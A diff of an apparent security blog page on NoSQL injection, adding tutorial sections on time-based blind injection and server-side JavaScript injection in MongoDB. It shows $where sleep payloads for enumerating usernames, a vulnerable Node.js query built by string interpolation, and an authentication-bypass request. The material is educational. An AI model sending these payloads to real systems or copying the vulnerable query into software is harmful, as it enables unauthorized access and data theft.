@@ -77,8 +77,8 @@
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-02-17T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-02-17T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-02-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-18T00:00:00+00:00">
     <meta property="og:image" content="http://localhost:1313/posts/nosql/feature.webp">
 
   
@@ -104,15 +104,15 @@
       "name": "Max"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-02-17T00:00:00\u002b00:00",
-    "datePublished": "2025-02-17T00:00:00\u002b00:00",
+    "dateCreated": "2025-02-18T00:00:00\u002b00:00",
+    "datePublished": "2025-02-18T00:00:00\u002b00:00",
     
-    "dateModified": "2025-02-17T00:00:00\u002b00:00",
+    "dateModified": "2025-02-18T00:00:00\u002b00:00",
     
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "437"
+    "wordCount": "787"
   }]
   </script>
 
@@ -568,16 +568,10 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-17T00:00:00&#43;00:00">17 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+  <time datetime="2025-02-18T00:00:00&#43;00:00">18 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
   
 
   
-  
-  <span class="pl-2"><span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Draft
-  </span>
-</span></span>
   
 </div>
 
@@ -633,8 +627,10 @@
         <li><a href="#blind-injection">Blind Injection</a>
           <ul>
             <li><a href="#boolean-based">Boolean-Based</a></li>
+            <li><a href="#time-based">Time-Based</a></li>
           </ul>
         </li>
+        <li><a href="#server-side-javascript-injection-span-classtext-primary-400ssjispan">Server-Side JavaScript Injection (<span class="text-primary-400">SSJI</span>)</a></li>
       </ul>
     </li>
   </ul>
@@ -657,8 +653,10 @@
         <li><a href="#blind-injection">Blind Injection</a>
           <ul>
             <li><a href="#boolean-based">Boolean-Based</a></li>
+            <li><a href="#time-based">Time-Based</a></li>
           </ul>
         </li>
+        <li><a href="#server-side-javascript-injection-span-classtext-primary-400ssjispan">Server-Side JavaScript Injection (<span class="text-primary-400">SSJI</span>)</a></li>
       </ul>
     </li>
   </ul>
@@ -855,7 +853,78 @@ search[$regex]=^Sea.* ✖️
 search[$regex]=^Sec.* ✔️
 …
 search[$regex]=^SecretProduct$
-</code></pre>
+</code></pre><p>The <code>$</code> indicates the end of a string, verifying if the entire word is correct.</p>
+
+
+<h4 class="relative group">Time-Based 
+    <div id="time-based" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#time-based" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>In a <span class="text-primary-400">Time-Based Blind Injection</span>, the attacker sends queries that cause the server to <span class="text-primary-400">delay its response when certain conditions are true</span>. By measuring these response times, the attacker can infer information about the database.</p>
+<p><b class="text-primary-400">Example Scenario</b>: Assume a NoSQL Injection vulnerability in the username parameter:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="nt">&#34;$where&#34;</span><span class="p">:</span> <span class="s2">&#34;function() { if(this.username == &#39;admin&#39;) { sleep(5000); } return true; }&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;randompassword&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><b class="text-primary-400">Explanation</b>: JavaScript Function &ndash; The <code>this</code> keyword refers to the current document being evaluated in the collection.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JS" data-lang="JS"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">username</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span> <span class="p">}</span>
+</span></span></code></pre></div><p><b class="text-primary-400">Behavior</b>: If <code>this.username == 'admin'</code> evaluates to true, the function calls <code>sleep(5000)</code> to delay the response by 5 seconds, indicating that the username exists. Otherwise, the response time remains normal.</p>
+<p>An attacker can enumerate usernames or other fields character by character using a similar method:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Json" data-lang="Json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;$where&#34;</span><span class="p">:</span> <span class="s2">&#34;function() { if (this.username[0] == &#39;a&#39;) { sleep(5000); } return true; }&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;irrelevant&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>By systematically testing each character position, the attacker can reconstruct sensitive information.</p>
+
+
+<h3 class="relative group">Server-Side JavaScript Injection (<span class="text-primary-400">SSJI</span>) 
+    <div id="server-side-javascript-injection-span-classtext-primary-400ssjispan" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#server-side-javascript-injection-span-classtext-primary-400ssjispan" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>MongoDB allows the use of JavaScript expressions in queries via the <code>$where</code> operator. If not handled securely, this feature can be exploited.</p>
+<p><b class="text-primary-400">Example Scenario</b>: Consider the following MongoDB query in a Node.js application:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JS" data-lang="JS"><span class="line"><span class="cl"><span class="nx">collection</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">$where</span><span class="o">:</span> <span class="sb">`this.username == &#39;</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">&#39; &amp;&amp; this.password == &#39;</span><span class="si">${</span><span class="nx">password</span><span class="si">}</span><span class="sb">&#39;`</span>
+</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Logged in as &#39;</span> <span class="o">+</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Authentication failed&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>An attacker can manipulate the <code>username</code> field to inject malicious code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">example.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">username=admin&#39; || true //&amp;password=anything
+</span></span></code></pre></div><p>Resulting Query:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JS" data-lang="JS"><span class="line"><span class="cl"><span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">$where</span><span class="o">:</span> <span class="s2">&#34;this.username == &#39;admin&#39; || true // &#39; &amp;&amp; this.password == &#39;anything&#39;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>Effect: The condition <code>this.username == 'admin' || true</code> always evaluates to true, allowing the attacker to bypass authentication.</p>
+<p><b class="text-primary-400">Further Exploitation</b>: Attackers can use injections like <code>&quot; || &quot;&quot;==&quot;</code> or <code>&quot; || true || &quot;&quot;==&quot;</code> to evaluate the entire query to true. They can also enumerate fields using functions like <code>match($regex)</code> and the character-by-character approach mentioned earlier.</p>
+
           
           
           
@@ -1234,7 +1303,7 @@ search[$regex]=^SecretProduct$
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/template/">
+            <a class="flex group mr-3" href="/posts/ble/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1246,23 +1315,6 @@ search[$regex]=^SecretProduct$
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Template</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-01-29T00:00:00&#43;00:00">29 January 2025</time>
-                  
-                </span>
-              </span>
-            </a>
-          
-        </span>
-        <span>
-          
-            <a class="flex text-right group ml-3" href="/posts/ble/">
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                   >Bluetooth Low Energy Hacking 101</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
@@ -1271,15 +1323,10 @@ search[$regex]=^SecretProduct$
                   
                 </span>
               </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
             </a>
+          
+        </span>
+        <span>
           
         </span>
       </div>
